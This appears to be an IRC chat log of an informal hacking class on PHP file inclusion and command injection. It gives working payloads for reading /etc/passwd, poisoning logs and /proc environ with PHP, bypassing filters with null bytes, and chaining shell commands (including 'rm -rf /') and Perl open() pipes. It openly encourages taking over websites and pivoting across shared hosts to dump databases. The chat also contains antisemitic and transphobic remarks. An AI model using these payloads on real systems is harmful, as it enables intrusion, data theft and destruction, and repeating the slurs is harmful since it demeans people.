@@ -1,0 +1,567 @@
+File Inclusions and Command Injections (by xochipilli and venom)
+
+ <venom>	 a remote file inclusion vulnerability, also called insecure
+ <venom>	 direct object referencing in some cases
+ <venom>	code is included &&/|| executed 
+ <venom>	based on user input
+ <venom>	a lot of php coders
+ <venom>	do eet wrong
+ <venom>	and in stead of making a function 
+ <venom>	they fucking include($shit)
+ <xochipilli>	this USUALLY happens with PHP
+ <xochipilli>	because php's include() function
+ <xochipilli>	will EXECUTE any PHP CODE in the included file
+ <xochipilli>	it does not matter if its a goddamn .png
+ <xochipilli>	if theres php in it
+ <xochipilli>	it will get executed
+ <xochipilli>	so, like venom is saying
+ <xochipilli>	some coders get lazy
+ <xochipilli>	theres nothing inherently wrong about using include(), you just have to be careful when youre including user input
+ <venom>	careful?
+ <venom>	solution: don't include user input
+ <xochipilli>	well
+ <xochipilli>	whitelist
+ <xochipilli>	etc
+ <xochipilli>	dont fuck around
+ <xochipilli>	so
+ <xochipilli>	there are two major types
+ <xochipilli>	of file inclusion vulns
+ <xochipilli>	remote and local
+ <venom>	some are both
+ <venom>	some are one or the other
+ <venom>	just depends
+ <xochipilli>	a remote file inclusion happens when the server is configured to allow php to include() remove files
+ <xochipilli>	meaning you call
+ <xochipilli>	include('http://whatever.com/myfile.php');
+ <xochipilli>	you can even use 
+ <xochipilli>	ftp:// etc
+ <xochipilli>	iono about samba://
+ <venom>	i believe its any protocol that php has a native driver for
+ <venom>	it'd be smb://
+ <venom>	not samba://
+ <venom>	if its accessible anyway
+ <xochipilli>	that makes sense
+ <venom>	if its got the *.so
+ <venom>	it can do it
+ <xochipilli>	^
+ <xochipilli>	so
+ <xochipilli>	exploiting RFIs
+ <xochipilli>	is pretty trivial
+ <venom>	yea
+ <xochipilli>	you just upload your malicious php
+ <venom>	jus put google.com
+ <xochipilli>	and include it
+ <venom>	in the thing
+ <venom>	n it'll show the front of google
+ <venom>	if its vuln
+ <xochipilli>	^
+ <xochipilli>	so now
+ <xochipilli>	a local file inclusion
+ <xochipilli>	is when some system administrator got smart
+ <xochipilli>	disabled remote inclues
+ <xochipilli>	so you can only include files on the box
+ <xochipilli>	what this means?
+ <xochipilli>	you have to get your malicious code onto their server somehow
+ <venom>	must inject yer own code
+ <venom>	if u want to execute shit
+ <xochipilli>	the clever part, is how u do this
+ <venom>	^
+ <venom>	there are many ways
+ <venom>	error log injection, access log injection, user agent injection
+ <venom>	i saw syslog injection once
+ <venom>	that was wierd
+ <xochipilli>	shit
+ <xochipilli>	lets say theres an email service
+ <xochipilli>	or a file upload
+ <venom>	^
+ <xochipilli>	ANYTHING that can let you get textual php code onto their server
+ <xochipilli>	in such a way the apache user can read it
+ <xochipilli>	a common method
+ <xochipilli>	is to upload an avatar
+ <xochipilli>	w/ php in the image
+ <xochipilli>	looks like a fugly image
+ <xochipilli>	has php in it
+ <ErrProne>	avatar.php.jpg
+ <xochipilli>	any log files
+ <xochipilli>	apache logs are commonly used
+ <xochipilli>	so
+ <xochipilli>	lets say you found your first LFI
+ <xochipilli>	step 1. find a log file, we'll say, apache, because its a simple example
+ <xochipilli>	how to find a log file?
+ <xochipilli>	basically check known locations until you find it
+ <xochipilli>	u can automate this w/ a bash script easily
+ <xochipilli>	also i realized i didnt mention this
+ <xochipilli>	when fuzzing for a LFI vuln
+ <xochipilli>	look for /etc/passwd, boot.ini
+ <xochipilli>	any file that is always there on a given OS
+ <xochipilli>	so, continuing w/ our example
+ <xochipilli>	if we have
+ <xochipilli>	http://whatever.com/main.php?page=contact.php
+ <xochipilli>	we plug in
+ <xochipilli>	http://whatever.com/main.php?page=/etc/passwd
+ <xochipilli>	and :O theres the passwd file
+ <xochipilli>	now we want to find the log file
+ <xochipilli>	so we check a few locations
+ <xochipilli>	http://whatever.com/main.php?page=/var/log/httpd/error_log
+ <xochipilli>	http://whatever.com/main.php?page=/var/log/apache2/error_log
+ <xochipilli>	http://whatever.com/main.php?page=/etc/httpd/logs/error_log
+ <xochipilli>	im sure you can see how this would be easily automated
+ <xochipilli>	so lets say that last one
+ <xochipilli>	http://whatever.com/main.php?page=/etc/httpd/logs/error_log
+ <xochipilli>	is the correct location
+ <xochipilli>	we get to step 2
+ <xochipilli>	we have to generate an error w/ php code in it
+ <xochipilli>	can anyone think of a simple way to do this?
+ <MrWonderfull>	upload dummy php
+ <xochipilli>	well, you dont have upload axx to the server
+ <xochipilli>	so you want to generate an error w/ php in it
+ <xochipilli>	that will be written to the log file, so you can include it
+ <xochipilli>	gah u guys suck :P
+ <xochipilli>	you can try a 404
+ <ErrProne>	?page=xx
+ <xochipilli>	or an invalid request
+ <xochipilli>	i find the latter works best
+ <xochipilli>	invalid request
+ <xochipilli>	simplest way
+ <darkspline>	request URI should have php code in it
+ <darkspline>	request log file
+ <xochipilli>	dont put a / at the bigging of the URI
+ <darkspline>	hope it executes 
+ <xochipilli>	so youd do
+ <xochipilli>	GET <?php your php ?>
+ <xochipilli>	itll generate an invalid request error
+ <xochipilli>	and log the request
+ <xochipilli>	in all of its glory
+ <venom>	n then usually you can get it in the error_log
+ <venom>	or
+ <venom>	sometimes
+ <xochipilli>	^
+ <venom>	in /proc/self/fd/2
+ <xochipilli>	ah yes, 
+ <xochipilli>	venom: 
+ <venom>	xochipilli: 
+ <xochipilli>	wanna talk about the proc dir?
+ <darkspline>	ssh <?php code ?>@vulnserver.com
+ <darkspline>	ftw
+ <venom>	i suppose i could
+ <xochipilli>	darkspline: good one ^
+ <venom>	proc is p. cool
+ <darkspline>	;-)
+ <xochipilli>	good example
+ <xochipilli>	because
+ <xochipilli>	ANYTHING
+ <xochipilli>	that generates logs u can read
+ <venom>	yeah
+ <xochipilli>	that u can cram php into
+ <venom>	jus make sure you can read them
+ <xochipilli>	you can get really creative
+ <venom>	cuz usually /var/log/secure isnt accessible from userland
+ <venom>	jus sayin
+ <darkspline>	good pt venom
+ <venom>	anyway
+ <venom>	 /proc
+ <xochipilli>	apache logs are convenient since you can almost always read them
+ <venom>	is pretty cool
+ <venom>	now, 
+ <venom>	depending on the model of the httpd ur sploitin
+ <venom>	(apache, lighty, nginx, what have you)
+ <venom>	sometimes the PID is gonna be the parent pid of the daemon (u can find it in /var/lock/daemon_name.pid)
+ <venom>	now
+ <venom>	in the /proc folder
+ <venom>	u can do /proc/self/
+ <venom>	self is always the active process
+ <venom>	but sometimes the self symlink either isnt there
+ <venom>	or u dont have perms for it
+ <venom>	if u can find that pid file
+ <venom>	then you can go to /proc/PID/environ or /proc/PID/fd/2
+ <venom>	or /proc/PID/maps (to see open files)
+ <venom>	now
+ <venom>	the environment
+ <venom>	 /proc/PID/environ
+ <venom>	or /proc/self/environment
+ <venom>	because of php
+ <venom>	always contains the $_SERVER superglobal array
+ <venom>	n so 
+ <venom>	that array
+ <venom>	has a user agent
+ <venom>	so u can put
+ <venom>	php
+ <venom>	in ur user agent
+ <venom>	n then include the environment
+ <venom>	and execute code that way
+ <venom>	xochipilli: all urs... u tell them about null bytes or multibyte encoding or auto-extension shit or mod rewrite
+ <xochipilli>	ok
+ <xochipilli>	nullbytes
+ <xochipilli>	this is a fun little trick
+ <xochipilli>	remember the example i mentioned earlier?
+ <xochipilli>	http://whatever.com/main.php?page=contact.php
+ <xochipilli>	you may have seen a link like that before, but theyre fairly uncommon now
+ <xochipilli>	for reasons that should be obvious now
+ <xochipilli>	but, how many of you have seen
+ <xochipilli>	http://whatever.com/main.php?page=contact
+ <xochipilli>	im guessin a few
+ <venom>	or
+ <venom>	module=
+ <xochipilli>	sometimes theyll get rewritten, ill get to that in a sec
+ <venom>	is common too
+ <xochipilli>	yeah
+ <xochipilli>	so
+ <xochipilli>	null terminated strings
+ <xochipilli>	anyone know how this works?
+ <venom>	bcuz of c
+ <venom>	its because of c
+ <venom>	php is built from c
+ <darkspline>	yup
+ <darkspline>	compared to pascal stringts
+ <xochipilli>	god these kids are either very quiet or very absent
+ <xochipilli>	SPEAK UP
+ <xochipilli>	so
+ <venom>	so like, wen php tries to open a file, it reads the filename until the first \0 or %00 cuz dats how string termination worx
+ <MrWonderfull>	terminated string, when a forum topic goes dead
+ <xochipilli>	for those of you who dont know
+ <xochipilli>	lets say we have the string
+ <xochipilli>	"JEWS THE CONTROL THE MEDIA"
+ <venom>	lol
+ <xochipilli>	stored in memory
+ <xochipilli>	and we want to see how long it is
+ <xochipilli>	how do we do that?
+ <xochipilli>	how do we know when that string ends
+ <xochipilli>	and the dirty dirty tranny porn stored next to it in memory begins
+ <xochipilli>	?
+ <xochipilli>	theres a null byte at the end of the string
+ <xochipilli>	so u jus iterate over it till u find the null
+ <xochipilli>	simple neough
+ <xochipilli>	so
+ <xochipilli>	in the case of
+ <xochipilli>	http://whatever.com/main.php?page=contact
+ <xochipilli>	the php is appending a .php
+ <xochipilli>	so when we try to include
+ <xochipilli>	http://whatever.com/main.php?page=/etc/passwd
+ <xochipilli>	its guna try to read in
+ <xochipilli>	/etc/passwd.php
+ <xochipilli>	thats no good
+ <xochipilli>	so we gotta terminate that string
+ <xochipilli>	the uri encoding of null
+ <xochipilli>	is %00
+ <xochipilli>	something to note
+ <xochipilli>	suhosin
+ <xochipilli>	will block null bytes in the URI
+ <xochipilli>	some IDS systems may detect it
+ <xochipilli>	its noisy-ish
+ <xochipilli>	so
+ <xochipilli>	we feed in
+ <xochipilli>	http://whatever.com/main.php?page=/etc/passwd%00
+ <xochipilli>	the string terminates, and the .php gets ignored
+ <venom>	yuh
+ <xochipilli>	now, for those of you unfamiliar w/ mod_rewrite
+ <xochipilli>	its a way of taking a fugly url like
+ <xochipilli>	http://whatever.com/main.php?page=contact
+ <xochipilli>	an makin it look like
+ <xochipilli>	http://whatever.com/main.phg/page/contact
+ <xochipilli>	or whatever
+ <venom>	yea
+ <xochipilli>	however, usually
+ <venom>	whatevs.com/main/contact
+ <venom>	is usually
+ <venom>	what it look like
+ <xochipilli>	that will be a MVC framework
+ <xochipilli>	like code igniter
+ <venom>	rite
+ <xochipilli>	which are generally more secure than your average home grown php
+ <xochipilli>	because of all the nice libraries packaged in w/ them
+ <venom>	so it'll be in the format /databasetablename/templatename/controllername/idnumber
+ <venom>	or somethin like that
+ <xochipilli>	dont have to manually check a lot of stuff, security wise
+ <venom>	mix & match as it were
+ <xochipilli>	so, dont be fooled by the pretty url
+ <venom>	xochipilli: ye but most are vuln as hell
+ <xochipilli>	u can get em sometimes
+ <venom>	yea
+ <venom>	exactly
+ <venom>	ruby on rails jus makes me lol
+ <xochipilli>	haha
+ <xochipilli>	so thats basically lfi
+ <xochipilli>	theres other methods
+ <xochipilli>	but thats the basic methodology
+ <venom>	yeh
+ <xochipilli>	so, im guna talk about RCI
+ <xochipilli>	cuz i dont think thats been talked about at all
+ <xochipilli>	correct me if im wrong, Fox ?
+ <venom>	eval() lines gone wrong xochipilli ?
+ <xochipilli>	yes and no
+ <Frosty>	what if the %00 are filtered or blocked?
+<xochipilli>	suhosin does that
+ <venom>	^
+ <xochipilli>	no way around tha trly
+ <venom>	thas not true
+ <venom>	there are other encoding types
+ <venom>	that reconstruct into nulls
+ <venom>	or if u get lucky
+ <venom>	n u know its going thru the lcase() or strtolower() functions
+ <venom>	all that does is subtract the difference between a and A from the ascii code
+ <venom>	so u could put %00 + offset
+ <venom>	n then 
+ <venom>	when it goes thru strtolower()
+ <venom>	it becomes %00
+ <venom>	not always
+ <venom>	but there are ways around ;)
+ <xochipilli>	there almost always are
+ <xochipilli>	so RCI
+ <xochipilli>	remote command injection
+ <xochipilli>	fairly simple vuln, but like LFI
+ <xochipilli>	theres a million little details
+ <xochipilli>	when it comes to exploiting it
+ <xochipilli>	basically this happens when user input gets dumped into a system() exec(), or in the case of perl, open() call
+ <venom>	ooo
+ <venom>	ic ic
+ <xochipilli>	how u exploit this is fairly obvious
+ <MrWonderfull>	yay simple
+ <venom>	i thot u meant remote code inj
+ <venom>	lol
+ <xochipilli>	system("whois $url");
+ <xochipilli>	MrWonderfull: see where im goin here?
+ <xochipilli>	in fact
+ <xochipilli>	if you have
+ <xochipilli>	whois
+ <xochipilli>	installed on your system
+ <xochipilli>	i think its who is
+ <xochipilli>	hold on
+ <xochipilli>	let me confirm
+ <venom>	whois 
+ <venom>	will work
+ <xochipilli>	well i remember
+ <venom>	or i mean
+ <xochipilli>	theres a very common unix util
+ <venom>	u could just do
+ <venom>	groups
+ <xochipilli>	w/ a parsin error
+ <venom>	o
+ <xochipilli>	that lets you do this
+ <venom>	idk wut ur talkin about
+ <xochipilli>	hold plz
+ <venom>	u sure thats not just unclean php
+ <venom>	lol
+ <xochipilli>	yeah
+ <xochipilli>	sec
+ <xochipilli>	it mentions it in the man page
+ <xochipilli>	actually
+ <MrWonderfull>	so what can i read to understand what u talkin about here? all looks very interesting
+ <MrWonderfull>	=)
+ <xochipilli>	maybe its not whois
+ <xochipilli>	ill dig it up for you guys later
+ <xochipilli>	MrWonderfull: what dont you udnerstand so far?
+ <xochipilli>	understand*
+ <venom>	MrWonderfull: type
+ <venom>	info coreutils
+ <venom>	lol
+ <venom>	xochipilli: he total newb
+ <venom>	doesn't understand nethin thought string termination was closing a forum thread
+ <MrWonderfull>	^^
+ <xochipilli>	well, ill try to break it down for him
+ <xochipilli>	so
+ <xochipilli>	what system()
+ <xochipilli>	does
+ <xochipilli>	is execute a cli command
+ <xochipilli>	in this case, whois, which will bring up info on a domain
+ <MrWonderfull>	ah
+ <xochipilli>	if youre on linux, you can pull up a terminal
+ <xochipilli>	punch in
+ <xochipilli>	whois google.com
+ <xochipilli>	itll give u some nice info about google.com and who registered it
+ <xochipilli>	so, lets say i wrote a nice little script
+ <xochipilli>	so my friends and i can run whois from my website
+ <xochipilli>	id calll
+ <xochipilli>	system("whois $url");
+ <xochipilli>	where $url is the user input
+ <xochipilli>	follow?
+ <xochipilli>	so the url might be like
+ <MrWonderfull>	yep
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com
+ <xochipilli>	so now, in bash, theres a few ways you can 'string' commands together
+ <xochipilli>	for exanple
+ <xochipilli>	a command is terminated by a ;
+ <xochipilli>	so like
+ <xochipilli>	whois google.com; whois yahoo.com
+ <xochipilli>	will run those two commands in sequence
+ <venom>	^
+ <venom>	u can also use & or && 
+ <xochipilli>	so, what would happen if i did
+ <xochipilli>	or |
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com;rm -rf /;
+ <xochipilli>	or watever
+ <venom>	or u can issue subcmds with `` and $()
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com;SOME COMMAND;
+ <venom>	so like
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com;rm -rf /;
+ <venom>	if ; is filtered 
+ <xochipilli>	oops
+ <venom>	u could do
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com|SOME COMMAND|
+ <venom>	domain=$(whoami)
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com&&SOME COMMAND&&
+ <venom>	n it wuld say domain not found
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com&SOME COMMAND&
+ <venom>	in whois output
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com&`SOME COMMAND`
+ <venom>	n the username
+ <xochipilli>	http://whatever.com/whois.php?domain=google.com&$(SOME COMMAND)
+ <MrWonderfull>	it would execute as if it were part of the bash script?
+ <xochipilli>	yup
+ <venom>	yea sometimes
+ <venom>	if its vuln
+ <xochipilli>	because system() essentially runs a bash script
+ <venom>	^
+ <xochipilli>	so you can inject your own bash in
+ <xochipilli>	MrWonderfull: read the bash tut
+ <venom>	find -perms 777
+ <venom>	lol
+ <xochipilli>	itll make some ofthis a little more clear
+ <xochipilli>	so
+ <xochipilli>	another thing to note
+ <xochipilli>	venom: do you remember the bash variable
+ <xochipilli>	w/ a space in it
+ <xochipilli>	?
+ <MrWonderfull>	i wrote first script 2day, so leet
+ <xochipilli>	i though it ${IFM}
+ <xochipilli>	but im wrong
+ <xochipilli>	its something like that tho
+ <venom>	xochipilli: not off top of head
+ <xochipilli>	ill look it up for you guys
+ <xochipilli>	but sometimes, you might have issues w/ spaces
+ <xochipilli>	for whatever reason, their script might not allow them
+ <xochipilli>	conveniently, theres an environment variable in bash
+ <xochipilli>	which just contains a space
+ <venom>	^lol
+ <xochipilli>	cant remember what its called atm :/
+ <xochipilli>	ill look it up for you guys later
+ <venom>	not all distros got it
+ <venom>	but some do
+ <xochipilli>	^
+ <MrWonderfull>	%20?
+ <venom>	no
+ <xochipilli>	nah
+ <venom>	thats not an env var
+ <xochipilli>	that a uri encoded space
+ <Frosty>	can't we just run
+ <xochipilli>	bash variables look like $variable
+ <Frosty>	like system(php(include(RFI)))
+ <darkspline>	instead of nuyll injection couldn't you just space inject the hex val?
+ <xochipilli>	well, you could, itd be kinda silly tho
+ <xochipilli>	and it wouldnt look lik that
+ <xochipilli>	Frosty: you can execute any bash command
+ <xochipilli>	you can download and exec programs
+ <xochipilli>	do anything the apache user has privs to do
+ <xochipilli>	no need to muck about w/ php
+ <venom>	or the suphp user
+ <xochipilli>	^
+ <venom>	depends on the server config
+ <xochipilli>	some shared hosts
+ <xochipilli>	will use suphp
+ <Frosty>	that was to avoid the special char issue
+ <xochipilli>	Frosty: well, to do that youd need spaces
+ <xochipilli>	the command wouldnt actually look like that
+ <xochipilli>	so some shared hosts
+ <xochipilli>	use suphp
+ <xochipilli>	so that each users php runs as their own user
+ <xochipilli>	not apache
+ <xochipilli>	what is relaly "cool"
+ <xochipilli>	is that SOME DONT
+ <xochipilli>	meaning
+ <xochipilli>	if you pop one user on a shared host
+ <xochipilli>	you can read EVERY OTHER USERS WEB FILES
+ <xochipilli>	you can read out mysql logins
+ <xochipilli>	dump databases
+ <xochipilli>	modify php files (sometimes)
+ <xochipilli>	its fun time
+ <xochipilli>	s
+ <xochipilli>	make sense?
+ <xochipilli>	since all the users are essentially grouped under one user
+ <MrWonderfull>	pop a wser? what is?
+ <xochipilli>	user*
+ <xochipilli>	like, lets say
+ <xochipilli>	theres two websites
+ <xochipilli>	on one host
+ <xochipilli>	and one is vulnerable
+ <xochipilli>	if they're both running under the same account
+ <xochipilli>	you can access both
+ <Fox>	Claudie. PM me.
+ <xochipilli>	what suphp does, is make it so they all run under different accounts
+ <MrWonderfull>	i c
+ <venom>	but sometimes
+ <venom>	bad permissions
+ <venom>	let u access other accts anyway
+ <xochipilli>	^ also true
+ <xochipilli>	so
+ <xochipilli>	last tihng
+ <MrWonderfull>	so to pop a user is to have their access level?
+ <xochipilli>	yeah
+ <xochipilli>	pop == hack
+ <xochipilli>	execute commands as that user
+ <xochipilli>	in this case using a command injection
+ <MrWonderfull>	okie
+ <xochipilli>	now on some systems
+ <xochipilli>	the 'apache' user
+ <xochipilli>	runs all the php scripts
+ <xochipilli>	so any access you get will the access the apache user has
+ <xochipilli>	meaning you can access everyones web files, since theyre all grouped under apache
+ <xochipilli>	which as i said
+ <xochipilli>	is fun times
+ <xochipilli>	haha
+ <xochipilli>	this is fairly common with shitty shared shosts
+ <xochipilli>	its a good practice
+ <xochipilli>	if you cant own a site
+ <venom>	super-shitty shared hosts
+ <xochipilli>	see what else is hosted on the box
+ <venom>	^
+ <xochipilli>	maybe you can own another site
+ <xochipilli>	and get into their shit that way
+ <venom>	yup
+ <xochipilli>	so
+ <xochipilli>	perl's open()
+ <MrWonderfull>	mhm!
+ <xochipilli>	this wont make 100% sense unless you know
+ <xochipilli>	perl
+ <xochipilli>	but ill do my best to explain
+ <xochipilli>	lets say i wrote that whois script in perl
+ <xochipilli>	it would look like this:
+ <venom>	php also has popen() just like perls open() but u dont see it so often
+ <venom>	just a note
+ <xochipilli>	this doesnt apply to popen
+ <venom>	o
+ <xochipilli>	open("whois $url |");
+ <xochipilli>	open(WHOIS, "whois $url |");*
+ <xochipilli>	basically
+ <xochipilli>	to open a pipe in perl
+ <xochipilli>	you use the normal file open command
+ <xochipilli>	but u toss a | in there
+ <xochipilli>	meaning, if you can inject a | into any perl open
+ <xochipilli>	even if its not executed a command
+ <xochipilli>	it could just be an innocuous file read
+ <xochipilli>	open(FH, "files/$page");
+ <xochipilli>	if you do
+ <xochipilli>	open(FH, "files/|id|");
+ <xochipilli>	or watever
+ <xochipilli>	itll execute it
+ <xochipilli>	because perl's open is weird that way
+ <xochipilli>	thats a fairly obscure case, but i think its a fun one
+ <xochipilli>	so i mention it
+<xochipilli>	thats basically it
+ <xochipilli>	i hope not too much of this was repetitive
+ <xochipilli>	ill go through the other talk and figure out what was new
+ <xochipilli>	and append this as 'notes'
+ <xochipilli>	append the new stuff
+ <xochipilli>	i suspect hteres a few tricks that werent mentioned
+ <MrWonderfull>	hmmm
+ <xochipilli>	or if someone wants to go through
+ <xochipilli>	and makes notes
+ <xochipilli>	that would be much appreciated
+ <AcidWaSH>	thanx for the class xochipilli !!
+ <xochipilli>	np <3
+ <darkspline>	thats was cool
+ <darkspline>	thnxs
+ <xochipilli>	lots of lil trix
+ <xochipilli>	in there
+ <xochipilli>	part of why lfi and rci are fun sploits
+ <xochipilli>	you can rly get creative w/ em
+ <Frosty>	ty xochipilli 
+ <xochipilli>	np
